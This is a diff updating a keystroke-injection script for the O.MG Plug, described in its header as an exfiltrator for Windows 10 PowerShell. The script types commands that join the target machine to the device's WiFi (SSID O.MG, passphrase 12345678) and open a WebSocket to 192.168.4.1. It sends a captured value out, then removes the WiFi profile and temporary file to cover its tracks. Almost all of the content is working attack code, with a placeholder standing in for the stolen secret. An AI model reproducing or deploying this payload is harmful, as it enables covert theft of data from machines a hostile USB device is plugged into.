@@ -1,101 +1,78 @@
-REM --------------------------------------------------------------------
-REM Title: O.MG Plug Basic Local Exfiltrator
-REM Description: Exfiltrates via O.MG WebSocket API
-REM Author: thisismyrobot
-REM Target: Windows 10 (PowerShell)
-REM Version: 1.0
-REM Category: Exfiltration
-REM
-REM Local exfiltration for O.MG Plug Basic
-REM
-REM The Basic version of the Plug cannot do stuff like sharing a local
-REM storage device (at least at the time of writing), so this code
-REM does local exfil by connecting the target to the O.MG Plug's own
-REM WiFi and using WebSockets to save data to a setting.
-REM
-REM This assumes a WiFi-enabled target of course.
-REM
-REM Retrieve the data by using the CTList custom command under Debug.
-REM
-REM Designed to work with an O.MG Plug Basic with firmware v2.5-220322.
-REM --------------------------------------------------------------------
+REM_BLOCK
+--------------------------------------------------------------------
+Title: O.MG Plug Basic Local Exfiltrator
+Description: Exfiltrates via O.MG WebSocket API
+Author: thisismyrobot
+Target: Windows 10 (PowerShell)
+Version: 1.0
+Category: Exfiltration
 
+Local exfiltration for O.MG Plug Basic
+
+The Basic version of the Plug cannot do stuff like sharing a local
+storage device (at least at the time of writing), so this code
+does local exfil by connecting the target to the O.MG Plug's own
+WiFi and using WebSockets to save data to a setting.
+
+This assumes a WiFi-enabled target of course.
+
+Retrieve the data by using the CTList custom command under Debug.
+
+Designed to work with an O.MG Plug Basic with firmware v2.5-220322.
+--------------------------------------------------------------------
+END_REM
+
+DEFINE #PASSWORD Secret password
+
+DUCKY_LANG US
+DELAY 2000
 DEFAULT_DELAY 500
 
 GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 1000
-STRING cd c:\temp
-ENTER
+STRINGLN powershell
+STRINGLN cd c:\temp
 
 REM -----------------------
 REM Collect info to exfil.
 REM -----------------------
 
-STRING $e = "Secret password"
+STRING $e = "#PASSWORD"
 ENTER
 
 REM ----------------------------------
 REM Connect to the O.MG AP.
 REM ----------------------------------
 
-STRING echo '<?xml version="1.0"?><WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"><name>O.MG</name><SSIDConfig><SSID><name>O.MG</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>12345678</keyMaterial></sharedKey></security></MSM></WLANProfile>' > profile.xml
-ENTER
+STRINGLN echo '<?xml version="1.0"?><WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"><name>O.MG</name><SSIDConfig><SSID><name>O.MG</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>12345678</keyMaterial></sharedKey></security></MSM></WLANProfile>' > profile.xml
 
-STRING netsh wlan add profile "profile.xml"
-ENTER
+STRINGLN netsh wlan add profile "profile.xml"
 
-STRING netsh wlan connect name=O.MG
-ENTER
+STRINGLN netsh wlan connect name=O.MG
 
 REM --------------------------------
 REM Establish websocket connection.
 REM --------------------------------
 
-STRING $ws = New-Object Net.WebSockets.ClientWebSocket
-ENTER
-
-STRING $ct = New-Object Threading.CancellationToken($false)
-ENTER
-
-STRING $connectTask = $ws.ConnectAsync("ws://192.168.4.1/d/ws/issue", $ct)
-ENTER
-
-STRING do { Sleep(0.1) } until ($connectTask.IsCompleted)
-ENTER
+STRINGLN $ws = New-Object Net.WebSockets.ClientWebSocket
+STRINGLN $ct = New-Object Threading.CancellationToken($false)
+STRINGLN $connectTask = $ws.ConnectAsync("ws://192.168.4.1/d/ws/issue", $ct)
+STRINGLN do { Sleep(0.1) } until ($connectTask.IsCompleted)
 
 REM --------
 REM Upload.
 REM --------
 
-STRING $ct = New-Object Threading.CancellationToken($false)
-ENTER
-
-STRING $command = "[custom]CTSet`tcaptured`t$e"
-ENTER
-
-STRING [ArraySegment[byte]]$msg = [Text.Encoding]::Utf8.GetBytes($command)
-ENTER
-
-STRING $ws.SendAsync($msg, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $ct).GetAwaiter().GetResult()
-ENTER
-
+STRINGLN $ct = New-Object Threading.CancellationToken($false)
+STRINGLN $command = "[custom]CTSet`tcaptured`t$e"
+STRINGLN [ArraySegment[byte]]$msg = [Text.Encoding]::Utf8.GetBytes($command)
+STRINGLN $ws.SendAsync($msg, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $ct).GetAwaiter().GetResult()
 DELAY 1000
 
 REM ----------
 REM Clean up.
 REM ----------
 
-STRING netsh wlan disconnect
-ENTER
-
-STRING netsh wlan delete profile name="O.MG"
-ENTER
-
-STRING del .\profile.xml
-ENTER
-
-STRING exit
-ENTER
+STRINGLN netsh wlan disconnect
+STRINGLN netsh wlan delete profile name="O.MG"
+STRINGLN del .\profile.xml
+STRINGLN exit
